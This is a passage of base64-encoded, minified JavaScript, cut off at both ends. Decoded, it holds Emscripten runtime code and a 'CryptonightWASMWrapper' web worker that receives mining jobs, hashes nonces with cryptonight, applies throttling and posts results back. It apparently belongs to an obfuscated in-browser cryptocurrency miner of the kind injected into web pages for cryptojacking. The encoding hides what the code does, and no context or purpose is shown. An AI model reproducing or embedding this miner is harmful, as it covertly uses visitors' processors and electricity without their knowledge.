lsLCJfX19zeXNjYWxsMTQ2IjpfX19zeXNjYWxsMTQ2LCJEWU5BTUlDVE9QX1BUUiI6RFlOQU1JQ1RPUF9QVFIsInRlbXBEb3VibGVQdHIiOnRlbXBEb3VibGVQdHIsIkFCT1JUIjpBQk9SVCwiU1RBQ0tUT1AiOlNUQUNLVE9QLCJTVEFDS19NQVgiOlNUQUNLX01BWH07dmFyIGFzbT1Nb2R1bGVbImFzbSJdKE1vZHVsZS5hc21HbG9iYWxBcmcsTW9kdWxlLmFzbUxpYnJhcnlBcmcsYnVmZmVyKTtNb2R1bGVbImFzbSJdPWFzbTt2YXIgX2NyeXB0b25pZ2h0X2hhc2g9TW9kdWxlWyJfY3J5cHRvbmlnaHRfaGFzaCJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfY3J5cHRvbmlnaHRfaGFzaCJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBnZXRUZW1wUmV0MD1Nb2R1bGVbImdldFRlbXBSZXQwIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bImdldFRlbXBSZXQwIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9mcmVlPU1vZHVsZVsiX2ZyZWUiXT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlWyJhc20iXVsiX2ZyZWUiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgcnVuUG9zdFNldHM9TW9kdWxlWyJydW5Qb3N0U2V0cyJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJydW5Qb3N0U2V0cyJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBzZXRUZW1wUmV0MD1Nb2R1bGVbInNldFRlbXBSZXQwIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bInNldFRlbXBSZXQwIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIGVzdGFibGlzaFN0YWNrU3BhY2U9TW9kdWxlWyJlc3RhYmxpc2hTdGFja1NwYWNlIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bImVzdGFibGlzaFN0YWNrU3BhY2UiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX21lbW1vdmU9TW9kdWxlWyJfbWVtbW92ZSJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfbWVtbW92ZSJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBzdGFja1NhdmU9TW9kdWxlWyJzdGFja1NhdmUiXT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlWyJhc20iXVsic3RhY2tTYXZlIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9tZW1zZXQ9TW9kdWxlWyJfbWVtc2V0Il09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bIl9tZW1zZXQiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX21hbGxvYz1Nb2R1bGVbIl9tYWxsb2MiXT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlWyJhc20iXVsiX21hbGxvYyJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfY3J5cHRvbmlnaHRfY3JlYXRlPU1vZHVsZVsiX2NyeXB0b25pZ2h0X2NyZWF0ZSJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfY3J5cHRvbmlnaHRfY3JlYXRlIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9tZW1jcHk9TW9kdWxlWyJfbWVtY3B5Il09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bIl9tZW1jcHkiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX2Vtc2NyaXB0ZW5fZ2V0X2dsb2JhbF9saWJjPU1vZHVsZVsiX2Vtc2NyaXB0ZW5fZ2V0X2dsb2JhbF9saWJjIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bIl9lbXNjcmlwdGVuX2dldF9nbG9iYWxfbGliYyJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBzdGFja0FsbG9jPU1vZHVsZVsic3RhY2tBbGxvYyJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJzdGFja0FsbG9jIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIHNldFRocmV3PU1vZHVsZVsic2V0VGhyZXciXT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlWyJhc20iXVsic2V0VGhyZXciXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX3Nicms9TW9kdWxlWyJfc2JyayJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfc2JyayJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfZmZsdXNoPU1vZHVsZVsiX2ZmbHVzaCJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfZmZsdXNoIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIHN0YWNrUmVzdG9yZT1Nb2R1bGVbInN0YWNrUmVzdG9yZSJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJzdGFja1Jlc3RvcmUiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX2NyeXB0b25pZ2h0X2Rlc3Ryb3k9TW9kdWxlWyJfY3J5cHRvbmlnaHRfZGVzdHJveSJdPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGVbImFzbSJdWyJfY3J5cHRvbmlnaHRfZGVzdHJveSJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfX19lcnJub19sb2NhdGlvbj1Nb2R1bGVbIl9fX2Vycm5vX2xvY2F0aW9uIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bIl9fX2Vycm5vX2xvY2F0aW9uIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIGR5bkNhbGxfaWk9TW9kdWxlWyJkeW5DYWxsX2lpIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bImR5bkNhbGxfaWkiXS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgZHluQ2FsbF9paWlpPU1vZHVsZVsiZHluQ2FsbF9paWlpIl09KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZVsiYXNtIl1bImR5bkNhbGxfaWlpaSJdLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBkeW5DYWxsX3ZpaWk9TW9kdWxlWyJkeW5DYWxsX3ZpaWkiXT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlWyJhc20iXVsiZHluQ2FsbF92aWlpIl0uYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7UnVudGltZS5zdGFja0FsbG9jPU1vZHVsZVsic3RhY2tBbGxvYyJdO1J1bnRpbWUuc3RhY2tTYXZlPU1vZHVsZVsic3RhY2tTYXZlIl07UnVudGltZS5zdGFja1Jlc3RvcmU9TW9kdWxlWyJzdGFja1Jlc3RvcmUiXTtSdW50aW1lLmVzdGFibGlzaFN0YWNrU3BhY2U9TW9kdWxlWyJlc3RhYmxpc2hTdGFja1NwYWNlIl07UnVudGltZS5zZXRUZW1wUmV0MD1Nb2R1bGVbInNldFRlbXBSZXQwIl07UnVudGltZS5nZXRUZW1wUmV0MD1Nb2R1bGVbImdldFRlbXBSZXQwIl07TW9kdWxlWyJhc20iXT1hc207aWYobWVtb3J5SW5pdGlhbGl6ZXIpe2lmKHR5cGVvZiBNb2R1bGVbImxvY2F0ZUZpbGUiXT09PSJmdW5jdGlvbiIpe21lbW9yeUluaXRpYWxpemVyPU1vZHVsZVsibG9jYXRlRmlsZSJdKG1lbW9yeUluaXRpYWxpemVyKX1lbHNlIGlmKE1vZHVsZVsibWVtb3J5SW5pdGlhbGl6ZXJQcmVmaXhVUkwiXSl7bWVtb3J5SW5pdGlhbGl6ZXI9TW9kdWxlWyJtZW1vcnlJbml0aWFsaXplclByZWZpeFVSTCJdK21lbW9yeUluaXRpYWxpemVyfWlmKEVOVklST05NRU5UX0lTX05PREV8fEVOVklST05NRU5UX0lTX1NIRUxMKXt2YXIgZGF0YT1Nb2R1bGVbInJlYWRCaW5hcnkiXShtZW1vcnlJbml0aWFsaXplcik7SEVBUFU4LnNldChkYXRhLFJ1bnRpbWUuR0xPQkFMX0JBU0UpfWVsc2V7YWRkUnVuRGVwZW5kZW5jeSgibWVtb3J5IGluaXRpYWxpemVyIik7dmFyIGFwcGx5TWVtb3J5SW5pdGlhbGl6ZXI9KGZ1bmN0aW9uKGRhdGEpe2lmKGRhdGEuYnl0ZUxlbmd0aClkYXRhPW5ldyBVaW50OEFycmF5KGRhdGEpO0hFQVBVOC5zZXQoZGF0YSxSdW50aW1lLkdMT0JBTF9CQVNFKTtpZihNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdKWRlbGV0ZSBNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLnJlc3BvbnNlO3JlbW92ZVJ1bkRlcGVuZGVuY3koIm1lbW9yeSBpbml0aWFsaXplciIpfSk7ZnVuY3Rpb24gZG9Ccm93c2VyTG9hZCgpe01vZHVsZVsicmVhZEFzeW5jIl0obWVtb3J5SW5pdGlhbGl6ZXIsYXBwbHlNZW1vcnlJbml0aWFsaXplciwoZnVuY3Rpb24oKXt0aHJvdyJjb3VsZCBub3QgbG9hZCBtZW1vcnkgaW5pdGlhbGl6ZXIgIittZW1vcnlJbml0aWFsaXplcn0pKX1pZihNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdKXtmdW5jdGlvbiB1c2VSZXF1ZXN0KCl7dmFyIHJlcXVlc3Q9TW9kdWxlWyJtZW1vcnlJbml0aWFsaXplclJlcXVlc3QiXTtpZihyZXF1ZXN0LnN0YXR1cyE9PTIwMCYmcmVxdWVzdC5zdGF0dXMhPT0wKXtjb25zb2xlLndhcm4oImEgcHJvYmxlbSBzZWVtcyB0byBoYXZlIGhhcHBlbmVkIHdpdGggTW9kdWxlLm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCwgc3RhdHVzOiAiK3JlcXVlc3Quc3RhdHVzKyIsIHJldHJ5aW5nICIrbWVtb3J5SW5pdGlhbGl6ZXIpO2RvQnJvd3NlckxvYWQoKTtyZXR1cm59YXBwbHlNZW1vcnlJbml0aWFsaXplcihyZXF1ZXN0LnJlc3BvbnNlKX1pZihNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLnJlc3BvbnNlKXtzZXRUaW1lb3V0KHVzZVJlcXVlc3QsMCl9ZWxzZXtNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLHVzZVJlcXVlc3QpfX1lbHNle2RvQnJvd3NlckxvYWQoKX19fWZ1bmN0aW9uIEV4aXRTdGF0dXMoc3RhdHVzKXt0aGlzLm5hbWU9IkV4aXRTdGF0dXMiO3RoaXMubWVzc2FnZT0iUHJvZ3JhbSB0ZXJtaW5hdGVkIHdpdGggZXhpdCgiK3N0YXR1cysiKSI7dGhpcy5zdGF0dXM9c3RhdHVzfUV4aXRTdGF0dXMucHJvdG90eXBlPW5ldyBFcnJvcjtFeGl0U3RhdHVzLnByb3RvdHlwZS5jb25zdHJ1Y3Rvcj1FeGl0U3RhdHVzO3ZhciBpbml0aWFsU3RhY2tUb3A7dmFyIHByZWxvYWRTdGFydFRpbWU9bnVsbDt2YXIgY2FsbGVkTWFpbj1mYWxzZTtkZXBlbmRlbmNpZXNGdWxmaWxsZWQ9ZnVuY3Rpb24gcnVuQ2FsbGVyKCl7aWYoIU1vZHVsZVsiY2FsbGVkUnVuIl0pcnVuKCk7aWYoIU1vZHVsZVsiY2FsbGVkUnVuIl0pZGVwZW5kZW5jaWVzRnVsZmlsbGVkPXJ1bkNhbGxlcn07TW9kdWxlWyJjYWxsTWFpbiJdPU1vZHVsZS5jYWxsTWFpbj1mdW5jdGlvbiBjYWxsTWFpbihhcmdzKXthcmdzPWFyZ3N8fFtdO2Vuc3VyZUluaXRSdW50aW1lKCk7dmFyIGFyZ2M9YXJncy5sZW5ndGgrMTtmdW5jdGlvbiBwYWQoKXtmb3IodmFyIGk9MDtpPDQtMTtpKyspe2FyZ3YucHVzaCgwKX19dmFyIGFyZ3Y9W2FsbG9jYXRlKGludEFycmF5RnJvbVN0cmluZyhNb2R1bGVbInRoaXNQcm9ncmFtIl0pLCJpOCIsQUxMT0NfTk9STUFMKV07cGFkKCk7Zm9yKHZhciBpPTA7aTxhcmdjLTE7aT1pKzEpe2FyZ3YucHVzaChhbGxvY2F0ZShpbnRBcnJheUZyb21TdHJpbmcoYXJnc1tpXSksImk4IixBTExPQ19OT1JNQUwpKTtwYWQoKX1hcmd2LnB1c2goMCk7YXJndj1hbGxvY2F0ZShhcmd2LCJpMzIiLEFMTE9DX05PUk1BTCk7dHJ5e3ZhciByZXQ9TW9kdWxlWyJfbWFpbiJdKGFyZ2MsYXJndiwwKTtleGl0KHJldCx0cnVlKX1jYXRjaChlKXtpZihlIGluc3RhbmNlb2YgRXhpdFN0YXR1cyl7cmV0dXJufWVsc2UgaWYoZT09IlNpbXVsYXRlSW5maW5pdGVMb29wIil7TW9kdWxlWyJub0V4aXRSdW50aW1lIl09dHJ1ZTtyZXR1cm59ZWxzZXt2YXIgdG9Mb2c9ZTtpZihlJiZ0eXBlb2YgZT09PSJvYmplY3QiJiZlLnN0YWNrKXt0b0xvZz1bZSxlLnN0YWNrXX1Nb2R1bGUucHJpbnRFcnIoImV4Y2VwdGlvbiB0aHJvd246ICIrdG9Mb2cpO01vZHVsZVsicXVpdCJdKDEsZSl9fWZpbmFsbHl7Y2FsbGVkTWFpbj10cnVlfX07ZnVuY3Rpb24gcnVuKGFyZ3Mpe2FyZ3M9YXJnc3x8TW9kdWxlWyJhcmd1bWVudHMiXTtpZihwcmVsb2FkU3RhcnRUaW1lPT09bnVsbClwcmVsb2FkU3RhcnRUaW1lPURhdGUubm93KCk7aWYocnVuRGVwZW5kZW5jaWVzPjApe3JldHVybn1wcmVSdW4oKTtpZihydW5EZXBlbmRlbmNpZXM+MClyZXR1cm47aWYoTW9kdWxlWyJjYWxsZWRSdW4iXSlyZXR1cm47ZnVuY3Rpb24gZG9SdW4oKXtpZihNb2R1bGVbImNhbGxlZFJ1biJdKXJldHVybjtNb2R1bGVbImNhbGxlZFJ1biJdPXRydWU7aWYoQUJPUlQpcmV0dXJuO2Vuc3VyZUluaXRSdW50aW1lKCk7cHJlTWFpbigpO2lmKE1vZHVsZVsib25SdW50aW1lSW5pdGlhbGl6ZWQiXSlNb2R1bGVbIm9uUnVudGltZUluaXRpYWxpemVkIl0oKTtpZihNb2R1bGVbIl9tYWluIl0mJnNob3VsZFJ1bk5vdylNb2R1bGVbImNhbGxNYWluIl0oYXJncyk7cG9zdFJ1bigpfWlmKE1vZHVsZVsic2V0U3RhdHVzIl0pe01vZHVsZVsic2V0U3RhdHVzIl0oIlJ1bm5pbmcuLi4iKTtzZXRUaW1lb3V0KChmdW5jdGlvbigpe3NldFRpbWVvdXQoKGZ1bmN0aW9uKCl7TW9kdWxlWyJzZXRTdGF0dXMiXSgiIil9KSwxKTtkb1J1bigpfSksMSl9ZWxzZXtkb1J1bigpfX1Nb2R1bGVbInJ1biJdPU1vZHVsZS5ydW49cnVuO2Z1bmN0aW9uIGV4aXQoc3RhdHVzLGltcGxpY2l0KXtpZihpbXBsaWNpdCYmTW9kdWxlWyJub0V4aXRSdW50aW1lIl0pe3JldHVybn1pZihNb2R1bGVbIm5vRXhpdFJ1bnRpbWUiXSl7fWVsc2V7QUJPUlQ9dHJ1ZTtFWElUU1RBVFVTPXN0YXR1cztTVEFDS1RPUD1pbml0aWFsU3RhY2tUb3A7ZXhpdFJ1bnRpbWUoKTtpZihNb2R1bGVbIm9uRXhpdCJdKU1vZHVsZVsib25FeGl0Il0oc3RhdHVzKX1pZihFTlZJUk9OTUVOVF9JU19OT0RFKXtwcm9jZXNzWyJleGl0Il0oc3RhdHVzKX1Nb2R1bGVbInF1aXQiXShzdGF0dXMsbmV3IEV4aXRTdGF0dXMoc3RhdHVzKSl9TW9kdWxlWyJleGl0Il09TW9kdWxlLmV4aXQ9ZXhpdDt2YXIgYWJvcnREZWNvcmF0b3JzPVtdO2Z1bmN0aW9uIGFib3J0KHdoYXQpe2lmKE1vZHVsZVsib25BYm9ydCJdKXtNb2R1bGVbIm9uQWJvcnQiXSh3aGF0KX1pZih3aGF0IT09dW5kZWZpbmVkKXtNb2R1bGUucHJpbnQod2hhdCk7TW9kdWxlLnByaW50RXJyKHdoYXQpO3doYXQ9SlNPTi5zdHJpbmdpZnkod2hhdCl9ZWxzZXt3aGF0PSIifUFCT1JUPXRydWU7RVhJVFNUQVRVUz0xO3ZhciBleHRyYT0iXFxuSWYgdGhpcyBhYm9ydCgpIGlzIHVuZXhwZWN0ZWQsIGJ1aWxkIHdpdGggLXMgQVNTRVJUSU9OUz0xIHdoaWNoIGNhbiBnaXZlIG1vcmUgaW5mb3JtYXRpb24uIjt2YXIgb3V0cHV0PSJhYm9ydCgiK3doYXQrIikgYXQgIitzdGFja1RyYWNlKCkrZXh0cmE7aWYoYWJvcnREZWNvcmF0b3JzKXthYm9ydERlY29yYXRvcnMuZm9yRWFjaCgoZnVuY3Rpb24oZGVjb3JhdG9yKXtvdXRwdXQ9ZGVjb3JhdG9yKG91dHB1dCx3aGF0KX0pKX10aHJvdyBvdXRwdXR9TW9kdWxlWyJhYm9ydCJdPU1vZHVsZS5hYm9ydD1hYm9ydDtpZihNb2R1bGVbInByZUluaXQiXSl7aWYodHlwZW9mIE1vZHVsZVsicHJlSW5pdCJdPT0iZnVuY3Rpb24iKU1vZHVsZVsicHJlSW5pdCJdPVtNb2R1bGVbInByZUluaXQiXV07d2hpbGUoTW9kdWxlWyJwcmVJbml0Il0ubGVuZ3RoPjApe01vZHVsZVsicHJlSW5pdCJdLnBvcCgpKCl9fXZhciBzaG91bGRSdW5Ob3c9dHJ1ZTtpZihNb2R1bGVbIm5vSW5pdGlhbFJ1biJdKXtzaG91bGRSdW5Ob3c9ZmFsc2V9cnVuKCk7dmFyIENyeXB0b25pZ2h0V0FTTVdyYXBwZXI9KGZ1bmN0aW9uKCl7dGhpcy5jdHg9X2NyeXB0b25pZ2h0X2NyZWF0ZSgpO3RoaXMudGhyb3R0bGVXYWl0PTA7dGhpcy50aHJvdHRsZWRTdGFydD0wO3RoaXMudGhyb3R0bGVkSGFzaGVzPTA7dGhpcy53b3JrVGhyb3R0bGVkQm91bmQ9dGhpcy53b3JrVGhyb3R0bGVkLmJpbmQodGhpcyk7dGhpcy5jdXJyZW50Sm9iPW51bGw7dGhpcy50YXJnZXQ9bmV3IFVpbnQ4QXJyYXkoWzI1NSwyNTUsMjU1LDI1NSwyNTUsMjU1LDI1NSwyNTVdKTt2YXIgaGVhcD1Nb2R1bGUuSEVBUFU4LmJ1ZmZlcjt0aGlzLmlucHV0PW5ldyBVaW50OEFycmF5KGhlYXAsTW9kdWxlLl9tYWxsb2MoODQpLDg0KTt0aGlzLm91dHB1dD1uZXcgVWludDhBcnJheShoZWFwLE1vZHVsZS5fbWFsbG9jKDMyKSwzMik7c2VsZi5wb3N0TWVzc2FnZSgicmVhZHkiKTtzZWxmLm9ubWVzc2FnZT10aGlzLm9uTWVzc2FnZS5iaW5kKHRoaXMpfSk7Q3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUub25NZXNzYWdlPShmdW5jdGlvbihtc2cpe3ZhciBqb2I9bXNnLmRhdGE7aWYoam9iLnZlcmlmeV9pZCl7dGhpcy52ZXJpZnkoam9iKTtyZXR1cm59aWYoIXRoaXMuY3VycmVudEpvYnx8dGhpcy5jdXJyZW50Sm9iLmpvYl9pZCE9PWpvYi5qb2JfaWQpe3RoaXMuc2V0Sm9iKGpvYil9aWYoam9iLnRocm90dGxlKXt0aGlzLnRocm90dGxlV2FpdD0xLygxLWpvYi50aHJvdHRsZSktMTt0aGlzLnRocm90dGxlZFN0YXJ0PXRoaXMubm93KCk7dGhpcy50aHJvdHRsZWRIYXNoZXM9MDt0aGlzLndvcmtUaHJvdHRsZWQoKX1lbHNle3RoaXMud29yaygpfX0pO0NyeXB0b25pZ2h0V0FTTVdyYXBwZXIucHJvdG90eXBlLmRlc3Ryb3k9KGZ1bmN0aW9uKCl7X2NyeXB0b25pZ2h0X2Rlc3Ryb3kodGhpcy5jdHgpfSk7Q3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUuaGV4VG9CeXRlcz0oZnVuY3Rpb24oaGV4LGJ5dGVzKXt2YXIgYnl0ZXM9bmV3IFVpbnQ4QXJyYXkoaGV4Lmxlbmd0aC8yKTtmb3IodmFyIGk9MCxjPTA7YzxoZXgubGVuZ3RoO2MrPTIsaSsrKXtieXRlc1tpXT1wYXJzZUludChoZXguc3Vic3RyKGMsMiksMTYpfXJldHVybiBieXRlc30pO0NyeXB0b25pZ2h0V0FTTVdyYXBwZXIucHJvdG90eXBlLmJ5dGVzVG9IZXg9KGZ1bmN0aW9uKGJ5dGVzKXtmb3IodmFyIGhleD0iIixpPTA7aTxieXRlcy5sZW5ndGg7aSsrKXtoZXgrPShieXRlc1tpXT4+PjQpLnRvU3RyaW5nKDE2KTtoZXgrPShieXRlc1tpXSYxNSkudG9TdHJpbmcoMTYpfXJldHVybiBoZXh9KTtDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5tZWV0c1RhcmdldD0oZnVuY3Rpb24oaGFzaCx0YXJnZXQpe2Zvcih2YXIgaT0wO2k8dGFyZ2V0Lmxlbmd0aDtpKyspe3ZhciBoaT1oYXNoLmxlbmd0aC1pLTEsdGk9dGFyZ2V0Lmxlbmd0aC1pLTE7aWYoaGFzaFtoaV0+dGFyZ2V0W3RpXSl7cmV0dXJuIGZhbHNlfWVsc2UgaWYoaGFzaFtoaV08dGFyZ2V0W3RpXSl7cmV0dXJuIHRydWV9fXJldHVybiBmYWxzZX0pO0NyeXB0b25pZ2h0V0FTTVdyYXBwZXIucHJvdG90eXBlLnNldEpvYj0oZnVuY3Rpb24oam9iKXt0aGlzLmN1cnJlbnRKb2I9am9iO3RoaXMuYmxvYj10aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpO3RoaXMuaW5wdXQuc2V0KHRoaXMuYmxvYik7dmFyIHRhcmdldD10aGlzLmhleFRvQnl0ZXMoam9iLnRhcmdldCk7aWYodGFyZ2V0Lmxlbmd0aDw9OCl7Zm9yKHZhciBpPTA7aTx0YXJnZXQubGVuZ3RoO2krKyl7dGhpcy50YXJnZXRbdGhpcy50YXJnZXQubGVuZ3RoLWktMV09dGFyZ2V0W3RhcmdldC5sZW5ndGgtaS0xXX1mb3IodmFyIGk9MDtpPHRoaXMudGFyZ2V0Lmxlbmd0aC10YXJnZXQubGVuZ3RoO2krKyl7dGhpcy50YXJnZXRbaV09MjU1fX1lbHNle3RoaXMudGFyZ2V0PXRhcmdldH19KTtDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS5ub3c9KGZ1bmN0aW9uKCl7cmV0dXJuIHNlbGYucGVyZm9ybWFuY2U/c2VsZi5wZXJmb3JtYW5jZS5ub3coKTpEYXRlLm5vdygpfSk7Q3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUuaGFzaD0oZnVuY3Rpb24oaW5wdXQsb3V0cHV0LGxlbmd0aCl7dmFyIG5vbmNlPU1hdGgucmFuZG9tKCkqNDI5NDk2NzI5NSsxPj4+MDt0aGlzLmlucHV0WzM5XT0obm9uY2UmNDI3ODE5MDA4MCk+PjI0O3RoaXMuaW5wdXRbNDBdPShub25jZSYxNjcxMTY4MCk+PjE2O3RoaXMuaW5wdXRbNDFdPShub25jZSY2NTI4MCk+Pjg7dGhpcy5pbnB1dFs0Ml09KG5vbmNlJjI1NSk+PjA7X2NyeXB0b25pZ2h0X2hhc2godGhpcy5jdHgsaW5wdXQuYnl0ZU9mZnNldCxvdXRwdXQuYnl0ZU9mZnNldCxsZW5ndGgpfSk7Q3J5cHRvbmlnaHRXQVNNV3JhcHBlci5wcm90b3R5cGUudmVyaWZ5PShmdW5jdGlvbihqb2Ipe3RoaXMuYmxvYj10aGlzLmhleFRvQnl0ZXMoam9iLmJsb2IpO3RoaXMuaW5wdXQuc2V0KHRoaXMuYmxvYik7Zm9yKHZhciBpPTAsYz0wO2M8am9iLm5vbmNlLmxlbmd0aDtjKz0yLGkrKyl7dGhpcy5pbnB1dFszOStpXT1wYXJzZUludChqb2Iubm9uY2Uuc3Vic3RyKGMsMiksMTYpfV9jcnlwdG9uaWdodF9oYXNoKHRoaXMuY3R4LHRoaXMuaW5wdXQuYnl0ZU9mZnNldCx0aGlzLm91dHB1dC5ieXRlT2Zmc2V0LHRoaXMuYmxvYi5sZW5ndGgpO3ZhciByZXN1bHQ9dGhpcy5ieXRlc1RvSGV4KHRoaXMub3V0cHV0KTtzZWxmLnBvc3RNZXNzYWdlKHt2ZXJpZnlfaWQ6am9iLnZlcmlmeV9pZCx2ZXJpZmllZDpyZXN1bHQ9PT1qb2IucmVzdWx0fSl9KTtDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS53b3JrPShmdW5jdGlvbigpe3ZhciBoYXNoZXM9MDt2YXIgbWVldHNUYXJnZXQ9ZmFsc2U7dmFyIHN0YXJ0PXRoaXMubm93KCk7dmFyIGVsYXBzZWQ9MDtkb3t0aGlzLmhhc2godGhpcy5pbnB1dCx0aGlzLm91dHB1dCx0aGlzLmJsb2IubGVuZ3RoKTtoYXNoZXMrKzttZWV0c1RhcmdldD10aGlzLm1lZXRzVGFyZ2V0KHRoaXMub3V0cHV0LHRoaXMudGFyZ2V0KTtlbGFwc2VkPXRoaXMubm93KCktc3RhcnR9d2hpbGUoIW1lZXRzVGFyZ2V0JiZlbGFwc2VkPDFlMyk7dmFyIGhhc2hlc1BlclNlY29uZD1oYXNoZXMvKGVsYXBzZWQvMWUzKTtpZihtZWV0c1RhcmdldCl7dmFyIG5vbmNlSGV4PXRoaXMuYnl0ZXNUb0hleCh0aGlzLmlucHV0LnN1YmFycmF5KDM5LDQzKSk7dmFyIHJlc3VsdEhleD10aGlzLmJ5dGVzVG9IZXgodGhpcy5vdXRwdXQpO3NlbGYucG9zdE1lc3NhZ2Uoe2hhc2hlc1BlclNlY29uZDpoYXNoZXNQZXJTZWNvbmQsaGFzaGVzOmhhc2hlcyxqb2JfaWQ6dGhpcy5jdXJyZW50Sm9iLmpvYl9pZCxub25jZTpub25jZUhleCxyZXN1bHQ6cmVzdWx0SGV4fSl9ZWxzZXtzZWxmLnBvc3RNZXNzYWdlKHtoYXNoZXNQZXJTZWNvbmQ6aGFzaGVzUGVyU2Vjb25kLGhhc2hlczpoYXNoZXN9KX19KTtDcnlwdG9uaWdodFdBU01XcmFwcGVyLnByb3RvdHlwZS53b3JrVGhyb3R0bGVkPShmdW5jdGlvbigpe3ZhciBzdGFydD10aGlzLm5vdygpO3RoaXMuaGFzaCh0aGlzLmlucHV0LHRoaXMub3V0cHV0LHRoaXMuYmxvYi5sZW5ndGgpO3ZhciBlbmQ9dGhpcy5ub3coKTt2YXIgdGltZVBlckhhc2g9ZW5kLXN0YXJ0O3RoaXMudGhyb3R0bGVkSGFzaGVzKys7dmFyIGVsYXBzZWQ9ZW5kLXRoaXMudGhyb3R0bGVkU3RhcnQ7dmFyIGhhc2hlc1BlclNlY29uZD10aGlzLnRocm90dGxlZEhhc2hlcy8oZWxhcHNlZC8xZTMpO2lmKHRoaXMubWVldHNUYXJnZXQodGhpcy5vdXRwdXQsdGhpcy50YXJnZXQpKXt2YXIgbm9uY2VIZXg9dGhpcy5ieXRlc1RvSGV4KHRoaXMuaW5wdXQuc3ViYXJyYXkoMzksNDMpKTt2YXIgcmVzdWx0SGV4PXRoaXMuYnl0ZXNUb0hleCh0aGlzLm91dHB1dCk7c2VsZi5wb3N0TWVzc2FnZSh7aGFzaGVzUGVyU2Vjb25kOmhhc2hlc1BlclNlY29uZCxoYXNoZXM6dGhpcy50aHJvdHRsZWRIYXNoZXMsam9iX2lkOnRoaXMuY3VycmVudEpvYi5qb2JfaWQsbm9uY2U6bm9uY2VIZXgscmVzdWx0OnJlc3VsdEhleH0pO3RoaXMudGhyb3R0bGVkSGFzaGVzPTB9ZWxzZSBpZihlbGFwc2VkPjFlMyl7c2VsZi5wb3N0TWVzc2FnZSh7aGFzaGVzUGVyU2Vjb25kOmhhc2hlc1BlclNlY29uZCxoYXNoZXM6dGhpcy50aHJvdHRsZWRIYXNoZXN9KTt0aGlzLnRocm90dGxlZEhhc2hlcz0wfWVsc2V7dmFyIHdhaXQ9TWF0aC5taW4oMmUzLHRpbWVQZXJIYXNoKnRoaXMudGhyb3R0bGVXYWl0KTtzZXRUaW1lb3V0KHRoaXMud29ya1Rocm90dGxlZEJvdW5kLHdhaXQpfX0pO01vZHVsZVsib25SdW50aW1lSW5pdGlhbGl6ZWQiXT0oZnVuY3Rpb24